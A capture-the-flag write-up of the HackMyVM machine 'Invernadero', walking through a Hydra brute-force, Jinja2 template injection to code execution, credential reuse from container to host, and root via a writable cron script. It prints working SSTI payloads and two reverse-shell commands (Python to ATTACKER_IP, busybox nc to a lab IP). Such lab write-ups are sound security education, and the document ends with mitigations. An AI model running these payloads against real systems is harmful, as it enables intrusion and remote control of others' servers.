# Invernadero — HackMyVM

| Field         | Value                                                              |
| ------------- | ------------------------------------------------------------------ |
| Platform      | HackMyVM                                                           |
| Machine       | Invernadero                                                        |
| Difficulty    | Easy                                                               |
| OS            | Alpine Linux (host and container)                                  |
| Attack Vector | SSTI (Jinja2) → RCE → Credential Reuse → Cron Privilege Escalation |
| Date          | September 2026                                                     |
| Author        | jloffsec                                                           |

## Summary

Invernadero exposes an IoT dashboard built with Flask on port 8080. Initial access is gained through weak dashboard credentials, discovered via a targeted brute-force attack. Post-authentication, a Server-Side Template Injection (SSTI) vulnerability in the alert configuration form allows remote code execution inside a Docker container. Source code disclosure reveals hardcoded MQTT credentials that are reused to pivot to the host via SSH. Privilege escalation to root is achieved by exploiting write permissions on a shell script executed by a root-owned cron job.

## Reconnaissance

### Port scan

```bash
nmap -p- --open -sS -Pn -n --min-rate 2000 192.168.1.102
```

|Port|Service|
|---|---|
|22|SSH|
|80|HTTP (Apache)|
|8080|HTTP (Werkzeug/Flask)|

A full UDP scan of the top 100 ports returned no open ports.

```bash
nmap -sC -sV -O -p22,80,8080 192.168.1.102 -oN nmap-services.txt
```

![Nmap service scan](https://claude.ai/chat/screenshots/01-nmap-services.png)

### Port 80

Apache 2.4.68 default page ("It works"). Directory and file fuzzing (common wordlists, multiple extensions) produced no results beyond default Apache paths. This port is not part of the attack surface.

### Port 8080

A Flask application (`Werkzeug/3.1.8 Python/3.9.25`) serving an "Invernadero IoT" dashboard behind a login form.

```bash
curl -i http://192.168.1.102:8080/login
```

Directory fuzzing identified the accessible routes:

```
/
/sens
/alerts
/static/base.css
/static/login.css
```

`/`, `/sens`, and `/alerts` all redirect unauthenticated requests to `/login`.

![Dashboard login page](https://claude.ai/chat/screenshots/02-login-page.png)

## Vulnerabilities

- **Weak dashboard credentials** - the login form accepts common username/password combinations.
- **Server-Side Template Injection (Jinja2)** - the alert configuration form renders user-supplied input through Flask's Jinja2 engine without sanitization, leading to remote code execution.
- **Hardcoded credentials in source code** - the application's `app.py` contains a plaintext MQTT username and password, reused for SSH access on the host.
- **Insecure cron job permissions** - a root-owned cron job executes a shell script that is writable by a low-privileged user, enabling privilege escalation to root.

## Exploitation

### Credential brute-force

Enumeration of valid usernames via Burp Intruder against the login form's error message (`Usuario o contraseña incorrectos.`) was unsuccessful. A targeted wordlist of the most common username/password pairs was built and run with Hydra:

```bash
hydra -L top-20-common-passwords.txt -P top-20-common-passwords.txt 192.168.1.102 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:Usuario o contraseña incorrectos."
```

**Result:** `admin:admin123`

![Hydra successful login](https://claude.ai/chat/screenshots/03-hydra-success.png)

### SSTI discovery

The `/alerts` page's HTML source hints at the template engine in use:

```html
<input class="textbox" type="text" name="mensaje_custom" placeholder="Ej: Peligro en el sensor " required>
<small>Personalice su alerta usando variables Jinja como {{ sensor }}</small>
```

Submitting `{{ 1+1 }}` in the `mensaje_custom` field via `/guardar_alerta` returned `2` in the alert preview, confirming that user input is evaluated as a Jinja2 expression.

![SSTI confirmation](https://claude.ai/chat/screenshots/04-ssti-confirmed.png)

### Remote code execution

Jinja2's sandbox blocks direct access to `os`, but Python's object model can be traversed to reach it:

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Result:** `uid=100(operador) gid=65533(nogroup) groups=65533(nogroup)`

Reading `/etc/passwd` confirmed an Alpine Linux target (BusyBox userland, no `bash`). Available interpreters were checked before building a reverse shell payload:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('which nc; which python3').read() }}
```

`python3` was confirmed present. A base64-encoded Python reverse shell one-liner was delivered through the same primitive:

```bash
echo -n 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' | base64 -w 0
```

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo <base64_payload>|base64 -d|sh &').read() }}
```

A listener on the attacking machine received the shell:

```bash
nc -lvnp 4444
```

![Reverse shell obtained](https://claude.ai/chat/screenshots/05-reverse-shell.png)

## Privilege Escalation

### Container identification and source disclosure

The reverse shell lands inside a Docker container (confirmed via `/.dockerenv` and `/proc/1/cgroup`). Process listing (`ps aux`) showed a single application process, `python app.py`, pointing to the application source as the next enumeration target:

```bash
find / -name app.py 2>/dev/null
cat /app/app.py
```

The source revealed hardcoded MQTT broker credentials:

```python
usuario = app.config.get("MQTT_USER", "admin_invernadero")
password = app.config.get("MQTT_PASSWORD", "admin_invernadero123")
broker = app.config.get("MQTT_BROKER", "172.17.0.1")
```

`172.17.0.1` is the default Docker bridge gateway, indicating a service reachable on the host.

### Credential reuse — container to host

No MQTT client was available inside the container. The same credentials were tested against the host's exposed SSH service instead:

```bash
ssh admin_invernadero@192.168.1.102
```

This succeeded, landing as user `server1` on the host — outside the Docker container.

![SSH access to host](https://claude.ai/chat/screenshots/06-ssh-host-access.png)

### SUID enumeration

```bash
find / -perm -4000 2>/dev/null
```

Returned, among standard binaries, `/usr/local/bin/find` and `/bin/bbsuid`.

- `find` with SUID was used directly to escalate from `server1` to `admin_invernadero`:
    
    ```bash
    find . -exec /bin/sh \; -quit
    ```
    
- `bbsuid` is a BusyBox multi-call SUID wrapper requiring a symlink named after a valid applet. Enumeration of accepted applet names (`crontab`, `mount`) confirmed the SUID bit was effective, but both applets independently validate the caller's real UID (`getuid()`) rather than relying solely on the SUID bit, blocking privilege escalation through this path.
    

### Cron job privilege escalation

As `admin_invernadero`, a writable script was identified at `/opt/invernadero/backup_logs.sh`, executed every minute by a root-owned cron job (an automated MQTT log backup routine).

Write access was confirmed by injecting a harmless test payload:

```bash
cat > /opt/invernadero/backup_logs.sh << 'EOF'
#!/bin/sh
id > /tmp/cron_id.txt
EOF
```

```bash
cat /tmp/cron_id.txt
```

This confirmed execution as `root`. The script was then overwritten with a reverse shell payload:

```bash
cat > /opt/invernadero/backup_logs.sh << 'EOF'
#!/bin/sh
busybox nc 192.168.1.65 4445 -e /bin/sh
EOF
```

```bash
nc -lvnp 4445
```

Within the next cron cycle, a root shell connected back to the listener.

![Root shell via cron privilege escalation](https://claude.ai/chat/screenshots/07-root-shell.png)

## Conclusion

### Key Takeaways

- Application-layer credential brute-forcing should target common credential pairs, not just usernames, when username enumeration yields no signal.
- A hint referencing template syntax in a form's helper text is a direct indicator of a template injection vector.
- Jinja2 SSTI in Flask reliably escalates to RCE via Python's object graph (`self.__init__.__globals__` or `request.application.__globals__`), bypassing the sandbox's restriction on direct `import` access.
- Hardcoded service credentials in application source code are a common pivot point between isolated environments (container ↔ host), especially when the same credentials are reused across unrelated services (MQTT, SSH).
- SUID binaries should be validated against known privilege-escalation behavior (e.g., GTFOBins) before assuming the SUID bit alone confers root; BusyBox multi-call binaries can enforce their own UID checks independent of the file's permission bits.
- Root-owned cron jobs are a high-value target: always check write permissions on the invoked script and its directory before pursuing more complex escalation paths.

### Mitigation

- Enforce strong, non-default credentials on all authentication endpoints.
- Never render user-supplied input with `render_template_string()` or equivalent; use `render_template()` with predefined templates and treat all user input as data, not code.
- Remove hardcoded credentials from source code; use environment variables or a secrets manager, and avoid reusing credentials across services.
- Restrict cron job scripts and their containing directories to root-only write access.
- Apply least-privilege principles to container-to-host network access (e.g., restrict access to the Docker bridge gateway from application containers where not required).
